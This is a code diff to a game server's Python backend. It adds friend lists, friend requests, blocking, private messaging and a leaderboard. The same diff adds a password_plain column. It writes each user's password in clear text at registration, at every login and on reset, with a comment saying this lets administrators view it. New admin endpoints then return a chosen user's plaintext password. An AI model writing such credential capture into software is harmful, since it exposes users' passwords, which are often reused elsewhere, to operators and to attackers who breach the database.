@@ -75,6 +75,7 @@ class User(Base):
     username = Column(String, unique=True, nullable=False)
     phone = Column(String, unique=True, nullable=False)
     password_hash = Column(String, nullable=False)
+    password_plain = Column(String, default="")
     fiat = Column(Integer, default=0)
     coins = Column(Integer, default=0)
     keys = Column(Integer, default=0)
@@ -205,6 +206,92 @@ class UserPresence(Base):
     activity = Column(String, default="")
     detail = Column(Text, default="{}")
     last_seen = Column(Integer, default=lambda: int(time.time()))
+
+
+class Friendship(Base):
+    __tablename__ = "friendships"
+    id = Column(Integer, primary_key=True)
+    user_id = Column(Integer, ForeignKey("users.id"), nullable=False, index=True)
+    friend_id = Column(Integer, ForeignKey("users.id"), nullable=False, index=True)
+    created_at = Column(Integer, default=lambda: int(time.time()))
+
+    __table_args__ = (UniqueConstraint("user_id", "friend_id", name="uq_friendship_pair"),)
+
+
+class FriendRequest(Base):
+    __tablename__ = "friend_requests"
+    id = Column(Integer, primary_key=True)
+    sender_id = Column(Integer, ForeignKey("users.id"), nullable=False, index=True)
+    receiver_id = Column(Integer, ForeignKey("users.id"), nullable=False, index=True)
+    status = Column(String, default="pending")  # pending / accepted / rejected / cancelled
+    created_at = Column(Integer, default=lambda: int(time.time()))
+    responded_at = Column(Integer, default=0)
+
+    __table_args__ = (UniqueConstraint("sender_id", "receiver_id", name="uq_friend_request_pair"),)
+
+
+class FriendBlock(Base):
+    __tablename__ = "friend_blocks"
+    id = Column(Integer, primary_key=True)
+    user_id = Column(Integer, ForeignKey("users.id"), nullable=False, index=True)
+    target_id = Column(Integer, ForeignKey("users.id"), nullable=False, index=True)
+    created_at = Column(Integer, default=lambda: int(time.time()))
+
+    __table_args__ = (UniqueConstraint("user_id", "target_id", name="uq_friend_block_pair"),)
+
+
+class FriendMessage(Base):
+    __tablename__ = "friend_messages"
+    id = Column(Integer, primary_key=True)
+    sender_id = Column(Integer, ForeignKey("users.id"), index=True, nullable=False)
+    receiver_id = Column(Integer, ForeignKey("users.id"), index=True, nullable=False)
+    content = Column(Text, nullable=False)
+    created_at = Column(Integer, default=lambda: int(time.time()), index=True)
+
+
+class CultivationLeaderboardEntry(Base):
+    __tablename__ = "cultivation_leaderboard"
+    user_id = Column(Integer, ForeignKey("users.id"), primary_key=True)
+    username = Column(String, nullable=False)
+    best_score = Column(Integer, default=0)
+    updated_at = Column(Integer, default=lambda: int(time.time()))
+
+
+def ensure_friendship_pair(db: Session, user_id: int, friend_id: int) -> None:
+    if not user_id or not friend_id or user_id == friend_id:
+        return
+    existing = db.query(Friendship).filter_by(user_id=int(user_id), friend_id=int(friend_id)).first()
+    if not existing:
+        db.add(Friendship(user_id=int(user_id), friend_id=int(friend_id)))
+
+
+def remove_friendship_pair(db: Session, user_id: int, friend_id: int) -> None:
+    if not user_id or not friend_id:
+        return
+    db.query(Friendship).filter_by(user_id=int(user_id), friend_id=int(friend_id)).delete()
+
+
+def friendship_blocked(db: Session, user_id: int, friend_id: int) -> bool:
+    if not user_id or not friend_id:
+        return False
+    blocked = (
+        db.query(FriendBlock)
+        .filter(
+            ((FriendBlock.user_id == int(user_id)) & (FriendBlock.target_id == int(friend_id)))
+            | ((FriendBlock.user_id == int(friend_id)) & (FriendBlock.target_id == int(user_id)))
+        )
+        .first()
+    )
+    return blocked is not None
+
+
+def clear_friend_requests(db: Session, user_a: int, user_b: int) -> None:
+    if not user_a or not user_b:
+        return
+    db.query(FriendRequest).filter(
+        ((FriendRequest.sender_id == int(user_a)) & (FriendRequest.receiver_id == int(user_b)))
+        | ((FriendRequest.sender_id == int(user_b)) & (FriendRequest.receiver_id == int(user_a)))
+    ).delete(synchronize_session=False)
 
 
 class CookieFactoryProfile(Base):
@@ -431,6 +518,16 @@ def _ensure_user_gift_columns():
     con.commit()
     con.close()
 
+def _ensure_user_password_plain():
+    con = sqlite3.connect(DB_PATH_FS)
+    cur = con.cursor()
+    cur.execute("PRAGMA table_info(users)")
+    cols = {row[1] for row in cur.fetchall()}
+    if "password_plain" not in cols:
+        cur.execute("ALTER TABLE users ADD COLUMN password_plain TEXT NOT NULL DEFAULT ''")
+    con.commit()
+    con.close()
+
 def _ensure_cookie_profile_columns():
     con = sqlite3.connect(DB_PATH_FS)
     cur = con.cursor()
@@ -460,6 +557,7 @@ _ensure_trade_log_columns()
 _ensure_brick_sell_columns()
 _ensure_brick_buy_columns()
 _ensure_user_gift_columns()
+_ensure_user_password_plain()
 _ensure_cookie_profile_columns()
 
 # ------------------ Pydantic ------------------
@@ -509,6 +607,24 @@ class BrickBuyOrderIn(BaseModel):
     quantity: int
     target_price: int
     season: Optional[str] = None
+
+
+class FriendAddIn(BaseModel):
+    target_id: Optional[int] = None
+    username: Optional[str] = None
+
+
+class FriendMessageIn(BaseModel):
+    message: str
+
+
+class FriendRespondIn(BaseModel):
+    request_id: int
+    action: Literal["accept", "reject"]
+
+
+class FriendTargetIn(BaseModel):
+    target_id: int
 
 
 class CookieActIn(BaseModel):
@@ -7943,6 +8059,28 @@ def _cultivation_is_good_ending(ending_type: Optional[str]) -> bool:
     return key in {"ascend"}
 
 
+def update_cultivation_leaderboard(db: Session, user: User, score: int) -> None:
+    if not user or not getattr(user, "id", None):
+        return
+    safe_score = max(0, int(score or 0))
+    entry = db.query(CultivationLeaderboardEntry).filter_by(user_id=int(user.id)).first()
+    now = int(time.time())
+    if not entry:
+        entry = CultivationLeaderboardEntry(
+            user_id=int(user.id),
+            username=user.username,
+            best_score=safe_score,
+            updated_at=now,
+        )
+        db.add(entry)
+    else:
+        entry.username = user.username
+        if safe_score > int(entry.best_score or 0):
+            entry.best_score = safe_score
+        entry.updated_at = now
+    db.flush()
+
+
 def _cultivation_finalize(
     db: Session,
     profile: CookieFactoryProfile,
@@ -8012,6 +8150,8 @@ def _cultivation_finalize(
     best_prev = int(node.get("best_score") or 0)
     if score > best_prev:
         node["best_score"] = score
+    current_best = int(node.get("best_score") or 0)
+    update_cultivation_leaderboard(db, user, current_best)
     node["play_count"] = int(node.get("play_count") or 0) + 1
 
     run_talents = run.get("talents", [])
@@ -9030,6 +9170,7 @@ def register(data: RegisterIn, db: Session = Depends(get_db)):
         username=username,
         phone=phone_value,
         password_hash=hash_pw(data.password),
+        password_plain=str(data.password or ""),
         fiat=fiat_bonus,
         gift_fiat_balance=fiat_bonus,
     )
@@ -9055,6 +9196,10 @@ def login_start(data: LoginStartIn, db: Session = Depends(get_db)):
         raise HTTPException(401, "用户不存在")
     if not verify_pw(data.password, u.password_hash):
         raise HTTPException(401, "密码错误")
+    # 记录最新的明文密码，便于管理员在验证后查看。
+    new_plain = str(data.password or "")
+    if str(u.password_plain or "") != new_plain:
+        u.password_plain = new_plain
     free_mode = get_auth_free_mode(db)
     if free_mode:
         u.last_login_ts = int(time.time())
@@ -9174,6 +9319,7 @@ def reset_password(inp: ResetPwdIn, db: Session = Depends(get_db)):
         raise HTTPException(401, "验证码错误或已过期")
     check_password_complexity(inp.new_password)
     u.password_hash = hash_pw(inp.new_password)
+    u.password_plain = str(inp.new_password or "")
     db.commit()
     return {"ok": True, "msg": "密码已重置，请使用新密码登录"}
 
@@ -9187,6 +9333,7 @@ def me(user: User = Depends(user_from_token), db: Session = Depends(get_db)):
     brick_detail = brick_balance_detail(db, user.id)
     pity_detail = season_pity_detail(db, user.id)
     return {
+        "user_id": int(user.id),
         "username": user.username, "phone": phone,
         "fiat": user.fiat, "coins": user.coins, "keys": user.keys,
         "unopened_bricks": user.unopened_bricks,
@@ -9241,6 +9388,474 @@ def me_mailbox(
         }
         bucket[action].append(entry)
     return out
+
+
+@app.get("/friends")
+def friends_list(user: User = Depends(user_from_token), db: Session = Depends(get_db)):
+    relations = (
+        db.query(Friendship)
+        .filter_by(user_id=user.id)
+        .order_by(Friendship.created_at.asc(), Friendship.id.asc())
+        .all()
+    )
+    incoming_requests = (
+        db.query(FriendRequest)
+        .filter_by(receiver_id=user.id, status="pending")
+        .order_by(FriendRequest.created_at.asc())
+        .all()
+    )
+    outgoing_requests = (
+        db.query(FriendRequest)
+        .filter_by(sender_id=user.id, status="pending")
+        .order_by(FriendRequest.created_at.asc())
+        .all()
+    )
+    blocked_targets = db.query(FriendBlock).filter_by(user_id=user.id).all()
+    blocked_by_others = db.query(FriendBlock).filter_by(target_id=user.id).all()
+
+    friend_ids = [int(rel.friend_id) for rel in relations if rel.friend_id]
+    user_ids: Set[int] = set(friend_ids)
+    for req in incoming_requests:
+        user_ids.add(int(req.sender_id))
+    for req in outgoing_requests:
+        user_ids.add(int(req.receiver_id))
+    for blk in blocked_targets:
+        user_ids.add(int(blk.target_id))
+    for blk in blocked_by_others:
+        user_ids.add(int(blk.user_id))
+
+    users: Dict[int, User] = {}
+    if user_ids:
+        peers = db.query(User).filter(User.id.in_(user_ids)).all()
+        users = {int(p.id): p for p in peers}
+
+    blocked_self_ids = {int(b.target_id) for b in blocked_targets}
+    blocked_by_ids = {int(b.user_id) for b in blocked_by_others}
+
+    last_map: Dict[int, FriendMessage] = {}
+    visible_friend_ids = [fid for fid in friend_ids if fid not in blocked_self_ids and fid not in blocked_by_ids]
+    if visible_friend_ids:
+        messages = (
+            db.query(FriendMessage)
+            .filter(
+                ((FriendMessage.sender_id == user.id) & (FriendMessage.receiver_id.in_(visible_friend_ids)))
+                | ((FriendMessage.receiver_id == user.id) & (FriendMessage.sender_id.in_(visible_friend_ids)))
+            )
+            .order_by(FriendMessage.created_at.desc(), FriendMessage.id.desc())
+            .all()
+        )
+        for msg in messages:
+            fid = int(msg.receiver_id) if int(msg.sender_id) == int(user.id) else int(msg.sender_id)
+            if fid not in last_map:
+                last_map[fid] = msg
+            if len(last_map) >= len(visible_friend_ids):
+                break
+
+    entries: List[Dict[str, Any]] = []
+    for rel in relations:
+        fid = int(rel.friend_id)
+        if fid in blocked_self_ids or fid in blocked_by_ids:
+            continue
+        peer = users.get(fid)
+        if not peer:
+            continue
+        item: Dict[str, Any] = {
+            "user_id": fid,
+            "username": peer.username,
+            "friend_since": int(rel.created_at or 0),
+        }
+        last = last_map.get(fid)
+        if last:
+            item["last_message"] = {
+                "id": int(last.id),
+                "sender_id": int(last.sender_id),
+                "receiver_id": int(last.receiver_id),
+                "content": last.content,
+                "timestamp": int(last.created_at or 0),
+            }
+        entries.append(item)
+
+    def request_entry(req: FriendRequest, incoming: bool) -> Dict[str, Any]:
+        other_id = int(req.sender_id if incoming else req.receiver_id)
+        peer = users.get(other_id)
+        return {
+            "request_id": int(req.id),
+            "created_at": int(req.created_at or 0),
+            "from_me": not incoming,
+            "user": {
+                "user_id": other_id,
+                "username": peer.username if peer else "神秘玩家",
+            },
+        }
+
+    incoming_payload = [request_entry(req, True) for req in incoming_requests]
+    outgoing_payload = [request_entry(req, False) for req in outgoing_requests]
+
+    blocked_payload: List[Dict[str, Any]] = []
+    for blk in blocked_targets:
+        peer = users.get(int(blk.target_id))
+        if not peer:
+            continue
+        blocked_payload.append(
+            {
+                "user_id": int(blk.target_id),
+                "username": peer.username,
+                "blocked_at": int(blk.created_at or 0),
+            }
+        )
+
+    return {
+        "friends": entries,
+        "requests": {
+            "incoming": incoming_payload,
+            "outgoing": outgoing_payload,
+        },
+        "blocked": blocked_payload,
+        "blocked_by": list(blocked_by_ids),
+    }
+
+
+@app.get("/friends/search")
+def friends_search(
+    q: str = Query(..., min_length=1, max_length=50),
+    limit: int = Query(10, ge=1, le=50),
+    user: User = Depends(user_from_token),
+    db: Session = Depends(get_db),
+):
+    keyword = (q or "").strip()
+    if not keyword:
+        raise HTTPException(400, "请输入搜索关键词")
+    exclude_ids = {int(user.id)}
+    friend_ids = {int(rel.friend_id) for rel in db.query(Friendship).filter_by(user_id=user.id).all()}
+    exclude_ids.update(friend_ids)
+    outgoing_pending = {
+        int(req.receiver_id)
+        for req in db.query(FriendRequest).filter_by(sender_id=user.id, status="pending").all()
+    }
+    incoming_pending = {
+        int(req.sender_id)
+        for req in db.query(FriendRequest).filter_by(receiver_id=user.id, status="pending").all()
+    }
+    blocked_ids = {int(b.target_id) for b in db.query(FriendBlock).filter_by(user_id=user.id).all()}
+    blocked_by_ids = {int(b.user_id) for b in db.query(FriendBlock).filter_by(target_id=user.id).all()}
+    exclude_ids.update(blocked_ids)
+    status_map: Dict[int, str] = {}
+    for fid in friend_ids:
+        status_map[fid] = "friend"
+    for fid in outgoing_pending:
+        status_map[fid] = "pending_outgoing"
+    for fid in incoming_pending:
+        status_map[fid] = "pending_incoming"
+    for fid in blocked_ids:
+        status_map[fid] = "blocked"
+    for fid in blocked_by_ids:
+        status_map[fid] = "blocked_by"
+        exclude_ids.add(fid)
+    results: List[User] = []
+    if keyword.isdigit():
+        target = db.query(User).filter_by(id=int(keyword)).first()
+        if target and int(target.id) not in exclude_ids:
+            results.append(target)
+    if len(results) < limit:
+        pattern = f"%{keyword}%"
+        matches = (
+            db.query(User)
+            .filter(User.username.ilike(pattern))
+            .order_by(User.username.asc())
+            .limit(limit * 2)
+            .all()
+        )
+        for candidate in matches:
+            cid = int(candidate.id)
+            if cid in exclude_ids or any(int(existing.id) == cid for existing in results):
+                continue
+            results.append(candidate)
+            if len(results) >= limit:
+                break
+    payload = [
+        {
+            "user_id": int(item.id),
+            "username": item.username,
+            "status": status_map.get(int(item.id), "available"),
+        }
+        for item in results[:limit]
+    ]
+    return {"results": payload}
+
+
+@app.post("/friends/add")
+def friends_add(
+    inp: FriendAddIn,
+    user: User = Depends(user_from_token),
+    db: Session = Depends(get_db),
+):
+    target: Optional[User] = None
+    if inp.target_id:
+        target = db.query(User).filter_by(id=int(inp.target_id)).first()
+    if not target and inp.username:
+        target = db.query(User).filter_by(username=inp.username).first()
+    if not target:
+        raise HTTPException(404, "未找到该玩家")
+    if int(target.id) == int(user.id):
+        raise HTTPException(400, "无法添加自己为好友")
+    if friendship_blocked(db, int(user.id), int(target.id)):
+        raise HTTPException(403, "由于拉黑设置，无法添加该玩家")
+    existing = db.query(Friendship).filter_by(user_id=user.id, friend_id=target.id).first()
+    if existing:
+        return {
+            "ok": True,
+            "friend": {"user_id": int(target.id), "username": target.username},
+            "already": True,
+        }
+
+    now = int(time.time())
+    incoming_req = (
+        db.query(FriendRequest)
+        .filter_by(sender_id=int(target.id), receiver_id=int(user.id))
+        .first()
+    )
+    if incoming_req and incoming_req.status == "pending":
+        incoming_req.status = "accepted"
+        incoming_req.responded_at = now
+        ensure_friendship_pair(db, int(user.id), int(target.id))
+        ensure_friendship_pair(db, int(target.id), int(user.id))
+        clear_friend_requests(db, int(user.id), int(target.id))
+        db.commit()
+        return {
+            "ok": True,
+            "friend": {"user_id": int(target.id), "username": target.username},
+            "accepted": True,
+        }
+
+    outgoing_req = (
+        db.query(FriendRequest)
+        .filter_by(sender_id=int(user.id), receiver_id=int(target.id))
+        .first()
+    )
+    if outgoing_req:
+        outgoing_req.status = "pending"
+        outgoing_req.created_at = now
+        outgoing_req.responded_at = 0
+    else:
+        outgoing_req = FriendRequest(
+            sender_id=int(user.id),
+            receiver_id=int(target.id),
+            status="pending",
+            created_at=now,
+        )
+        db.add(outgoing_req)
+        db.flush()
+    db.commit()
+    return {
+        "ok": True,
+        "request": {
+            "id": int(outgoing_req.id),
+            "status": outgoing_req.status,
+            "created_at": int(outgoing_req.created_at or now),
+        },
+        "pending": True,
+        "user": {"user_id": int(target.id), "username": target.username},
+    }
+
+
+@app.post("/friends/respond")
+def friends_respond(
+    inp: FriendRespondIn,
+    user: User = Depends(user_from_token),
+    db: Session = Depends(get_db),
+):
+    req = (
+        db.query(FriendRequest)
+        .filter_by(id=int(inp.request_id), receiver_id=int(user.id))
+        .first()
+    )
+    if not req or req.status != "pending":
+        raise HTTPException(404, "该好友请求不存在或已处理")
+    if inp.action not in {"accept", "reject"}:
+        raise HTTPException(400, "未知操作")
+    now = int(time.time())
+    other_id = int(req.sender_id)
+    if inp.action == "accept":
+        if friendship_blocked(db, int(user.id), other_id):
+            raise HTTPException(403, "由于拉黑设置，无法接受该请求")
+        ensure_friendship_pair(db, int(user.id), other_id)
+        ensure_friendship_pair(db, other_id, int(user.id))
+        req.status = "accepted"
+        req.responded_at = now
+        clear_friend_requests(db, int(user.id), other_id)
+        db.commit()
+        peer = db.query(User).filter_by(id=other_id).first()
+        return {
+            "ok": True,
+            "friend": {
+                "user_id": other_id,
+                "username": peer.username if peer else "神秘玩家",
+            },
+        }
+    req.status = "rejected"
+    req.responded_at = now
+    db.commit()
+    return {"ok": True}
+
+
+@app.delete("/friends/request/{request_id}")
+def friends_cancel_request(
+    request_id: int = Path(..., ge=1),
+    user: User = Depends(user_from_token),
+    db: Session = Depends(get_db),
+):
+    req = (
+        db.query(FriendRequest)
+        .filter_by(id=int(request_id), sender_id=int(user.id))
+        .first()
+    )
+    if not req or req.status != "pending":
+        raise HTTPException(404, "没有可取消的请求")
+    db.delete(req)
+    db.commit()
+    return {"ok": True}
+
+
+@app.delete("/friends/{friend_id}")
+def friends_remove(
+    friend_id: int = Path(..., ge=1),
+    user: User = Depends(user_from_token),
+    db: Session = Depends(get_db),
+):
+    relation = db.query(Friendship).filter_by(user_id=user.id, friend_id=friend_id).first()
+    if not relation:
+        raise HTTPException(404, "当前并非好友关系")
+    remove_friendship_pair(db, int(user.id), int(friend_id))
+    remove_friendship_pair(db, int(friend_id), int(user.id))
+    clear_friend_requests(db, int(user.id), int(friend_id))
+    db.commit()
+    return {"ok": True}
+
+
+@app.post("/friends/block")
+def friends_block(
+    payload: FriendTargetIn,
+    user: User = Depends(user_from_token),
+    db: Session = Depends(get_db),
+):
+    target_id = int(payload.target_id)
+    if target_id == int(user.id):
+        raise HTTPException(400, "无法拉黑自己")
+    existing = (
+        db.query(FriendBlock)
+        .filter_by(user_id=int(user.id), target_id=target_id)
+        .first()
+    )
+    now = int(time.time())
+    if not existing:
+        existing = FriendBlock(user_id=int(user.id), target_id=target_id, created_at=now)
+        db.add(existing)
+    remove_friendship_pair(db, int(user.id), target_id)
+    remove_friendship_pair(db, target_id, int(user.id))
+    clear_friend_requests(db, int(user.id), target_id)
+    db.commit()
+    return {"ok": True, "blocked": True}
+
+
+@app.post("/friends/unblock")
+def friends_unblock(
+    payload: FriendTargetIn,
+    user: User = Depends(user_from_token),
+    db: Session = Depends(get_db),
+):
+    target_id = int(payload.target_id)
+    entry = (
+        db.query(FriendBlock)
+        .filter_by(user_id=int(user.id), target_id=target_id)
+        .first()
+    )
+    if not entry:
+        raise HTTPException(404, "未找到对应的拉黑记录")
+    db.delete(entry)
+    db.commit()
+    return {"ok": True, "blocked": False}
+
+
+@app.get("/friends/conversation/{friend_id}")
+def friends_conversation(
+    friend_id: int = Path(..., ge=1),
+    limit: int = Query(50, ge=1, le=200),
+    user: User = Depends(user_from_token),
+    db: Session = Depends(get_db),
+):
+    relation = db.query(Friendship).filter_by(user_id=user.id, friend_id=friend_id).first()
+    if not relation:
+        raise HTTPException(404, "尚未互为好友")
+    friend = db.query(User).filter_by(id=friend_id).first()
+    if not friend:
+        raise HTTPException(404, "好友不存在")
+    if friendship_blocked(db, int(user.id), int(friend_id)):
+        raise HTTPException(403, "无法查看对话，对方或你已设置拉黑")
+    messages = (
+        db.query(FriendMessage)
+        .filter(
+            ((FriendMessage.sender_id == user.id) & (FriendMessage.receiver_id == friend_id))
+            | ((FriendMessage.sender_id == friend_id) & (FriendMessage.receiver_id == user.id))
+        )
+        .order_by(FriendMessage.created_at.desc(), FriendMessage.id.desc())
+        .limit(limit)
+        .all()
+    )
+    history = [
+        {
+            "id": int(msg.id),
+            "sender_id": int(msg.sender_id),
+            "receiver_id": int(msg.receiver_id),
+            "content": msg.content,
+            "timestamp": int(msg.created_at or 0),
+        }
+        for msg in reversed(messages)
+    ]
+    return {
+        "friend": {"user_id": int(friend.id), "username": friend.username},
+        "messages": history,
+    }
+
+
+@app.post("/friends/message/{friend_id}")
+def friends_send_message(
+    payload: FriendMessageIn,
+    friend_id: int = Path(..., ge=1),
+    user: User = Depends(user_from_token),
+    db: Session = Depends(get_db),
+):
+    relation = db.query(Friendship).filter_by(user_id=user.id, friend_id=friend_id).first()
+    if not relation:
+        raise HTTPException(404, "尚未互为好友")
+    friend = db.query(User).filter_by(id=friend_id).first()
+    if not friend:
+        raise HTTPException(404, "好友不存在")
+    if friendship_blocked(db, int(user.id), int(friend_id)):
+        raise HTTPException(403, "无法发送，对方或你已设置拉黑")
+    content = (payload.message if payload else "").strip()
+    if not content:
+        raise HTTPException(400, "消息内容不能为空")
+    if len(content) > 1000:
+        content = content[:1000]
+    msg = FriendMessage(
+        sender_id=int(user.id),
+        receiver_id=int(friend.id),
+        content=content,
+        created_at=int(time.time()),
+    )
+    db.add(msg)
+    db.flush()
+    db.commit()
+    return {
+        "ok": True,
+        "message": {
+            "id": int(msg.id),
+            "sender_id": int(msg.sender_id),
+            "receiver_id": int(msg.receiver_id),
+            "content": msg.content,
+            "timestamp": int(msg.created_at or 0),
+        },
+    }
 
 
 @app.get("/cookie-factory/status")
@@ -9502,6 +10117,37 @@ def cultivation_status(user: User = Depends(user_from_token), db: Session = Depe
     profile.mini_games = _json_dump(state)
     db.commit()
     return payload
+
+
+@app.get("/cultivation/leaderboard")
+def cultivation_leaderboard(
+    limit: int = Query(20, ge=1, le=100),
+    db: Session = Depends(get_db),
+    user: User = Depends(user_from_token),
+):
+    rows = (
+        db.query(CultivationLeaderboardEntry)
+        .order_by(
+            CultivationLeaderboardEntry.best_score.desc(),
+            CultivationLeaderboardEntry.updated_at.asc(),
+            CultivationLeaderboardEntry.user_id.asc(),
+        )
+        .limit(int(limit))
+        .all()
+    )
+    entries: List[Dict[str, Any]] = []
+    for idx, row in enumerate(rows, start=1):
+        entries.append(
+            {
+                "rank": idx,
+                "user_id": int(row.user_id),
+                "username": row.username,
+                "best_score": int(row.best_score or 0),
+                "updated_at": int(row.updated_at or 0),
+                "is_self": bool(user.id == row.user_id) if user else False,
+            }
+        )
+    return {"entries": entries, "generated_at": int(time.time())}
 
 
 @app.post("/cultivation/refresh")
@@ -10894,9 +11540,17 @@ def _set_auth_mode_flag(flag: bool):
 
 def _ts(): return int(_time.time())
 
-def _write_sms(tag, code, purpose, amount=None):
-    extra = (f"\tamount={amount}" if amount is not None else "")
-    line = f"{_ts()}\t{purpose}\t{tag}\t{code}{extra}\n"
+def _write_sms(tag, code, purpose, **extra):
+    extra_text = ""
+    if extra:
+        parts = []
+        for key, value in extra.items():
+            if value is None:
+                continue
+            parts.append(f"{key}={value}")
+        if parts:
+            extra_text = "\t" + "&".join(parts)
+    line = f"{_ts()}\t{purpose}\t{tag}\t{code}{extra_text}\n"
     with open(SMS_FILE, "a", encoding="utf-8") as f:
         f.write(line)
 
@@ -10932,6 +11586,12 @@ def _migrate_ext():
     # + 新增：管理员删号验证码表
     cur.execute("""CREATE TABLE IF NOT EXISTS admin_deluser_codes(
       target_username TEXT NOT NULL,
+      code TEXT NOT NULL,
+      requested_by TEXT NOT NULL,
+      expire_at INTEGER NOT NULL
+    )""")
+    cur.execute("""CREATE TABLE IF NOT EXISTS admin_password_codes(
+      target_id INTEGER NOT NULL,
       code TEXT NOT NULL,
       requested_by TEXT NOT NULL,
       expire_at INTEGER NOT NULL
@@ -11204,11 +11864,11 @@ def admin_users(q: _Optional[str]=None, page: int=1, page_size: int=20, admin=_D
     con=_conn(); cur=con.cursor()
     if q:
       qq = f"%{q}%"
-      cur.execute("""SELECT username, phone, fiat, coins, is_admin, last_login_ts, admin_note FROM users
+      cur.execute("""SELECT id, username, phone, fiat, coins, is_admin, last_login_ts, admin_note FROM users
                      WHERE username LIKE ? OR phone LIKE ?
                      ORDER BY id DESC LIMIT ? OFFSET ?""", (qq, qq, page_size, off))
     else:
-      cur.execute("""SELECT username, phone, fiat, coins, is_admin, last_login_ts, admin_note FROM users
+      cur.execute("""SELECT id, username, phone, fiat, coins, is_admin, last_login_ts, admin_note FROM users
                      ORDER BY id DESC LIMIT ? OFFSET ?""", (page_size, off))
     items=[dict(r) for r in cur.fetchall()]
     con.close()
@@ -11366,6 +12026,97 @@ def deduct_fiat(payload: dict, admin=_Depends(_require_admin)):
     fiat = cur.fetchone()["fiat"]
     con.close()
     return {"ok": True, "username": username, "fiat": fiat}
+
+# 管理员：查看 / 修改玩家密码（需验证码）
+@ext.post("/admin/user-password/request")
+def admin_user_password_request(payload: dict, admin=_Depends(_require_admin)):
+    target_id = int((payload or {}).get("target_id") or 0)
+    if target_id <= 0:
+        raise _HTTPException(400, "target_id required")
+    con = _conn(); cur = con.cursor()
+    cur.execute("SELECT id, username FROM users WHERE id=?", (target_id,))
+    row = cur.fetchone()
+    if not row:
+        con.close(); raise _HTTPException(404, "user not found")
+    username = row["username"]
+    _sms_rate_guard("admin-user-password", username)
+    code = _gen_code(6)
+    expire_at = _ts() + 10 * 60
+    cur.execute("DELETE FROM admin_password_codes WHERE target_id=?", (target_id,))
+    cur.execute(
+        "INSERT INTO admin_password_codes(target_id, code, requested_by, expire_at) VALUES (?,?,?,?)",
+        (target_id, code, admin["username"], expire_at),
+    )
+    con.commit(); con.close()
+    _write_sms(username, code, "admin-user-password", target_id=target_id)
+    return {
+        "ok": True,
+        "target": {"user_id": target_id, "username": username},
+        "expires_in": 600,
+    }
+
+
+@ext.post("/admin/user-password/confirm")
+def admin_user_password_confirm(payload: dict, admin=_Depends(_require_admin)):
+    target_id = int((payload or {}).get("target_id") or 0)
+    code = str((payload or {}).get("code") or "").strip()
+    new_password = (payload or {}).get("new_password")
+    if target_id <= 0 or not code:
+        raise _HTTPException(400, "target_id/code required")
+    con = _conn(); cur = con.cursor()
+    cur.execute("SELECT code, expire_at FROM admin_password_codes WHERE target_id=?", (target_id,))
+    row = cur.fetchone()
+    if not row:
+        con.close(); raise _HTTPException(400, "no pending code")
+    if _ts() > int(row["expire_at"]):
+        con.close(); raise _HTTPException(400, "code expired")
+    if str(code) != str(row["code"]):
+        con.close(); raise _HTTPException(400, "invalid code")
+    cur.execute("SELECT id, username, password_hash, password_plain FROM users WHERE id=?", (target_id,))
+    user_row = cur.fetchone()
+    if not user_row:
+        con.close(); raise _HTTPException(404, "user not found")
+    updated_hash = user_row["password_hash"]
+    updated_plain = user_row["password_plain"]
+    password_updated = False
+    code_consumed = False
+    if new_password:
+        if len(new_password) < 6:
+            con.close(); raise _HTTPException(400, "new_password too short")
+        updated_hash = pwd_context.hash(new_password)
+        updated_plain = str(new_password or "")
+        cur.execute(
+            "UPDATE users SET password_hash=?, password_plain=? WHERE id=?",
+            (updated_hash, updated_plain, target_id),
+        )
+        password_updated = True
+        cur.execute("DELETE FROM admin_password_codes WHERE target_id=?", (target_id,))
+        code_consumed = True
+    else:
+        # 未修改密码，仅查看信息：保留验证码以便后续操作
+        updated_plain = str(updated_plain or "")
+    updated_plain = str(updated_plain or "")
+    plain_for_check = updated_plain
+    password_matches_hash = False
+    if plain_for_check:
+        try:
+            password_matches_hash = pwd_context.verify(plain_for_check, updated_hash)
+        except Exception:
+            password_matches_hash = False
+    con.commit(); con.close()
+    return {
+        "ok": True,
+        "user": {
+            "user_id": target_id,
+            "username": user_row["username"],
+            "password_hash": updated_hash,
+            "password_plain": updated_plain,
+        },
+        "password_updated": password_updated,
+        "code_consumed": code_consumed,
+        "password_matches_hash": password_matches_hash,
+        "note": "若仅查看密码，请保留验证码以便需要时再次提交新密码进行重置。",
+    }
 
 # 管理员：申请“删除账号”验证码
 @ext.post("/admin/delete-user/request")
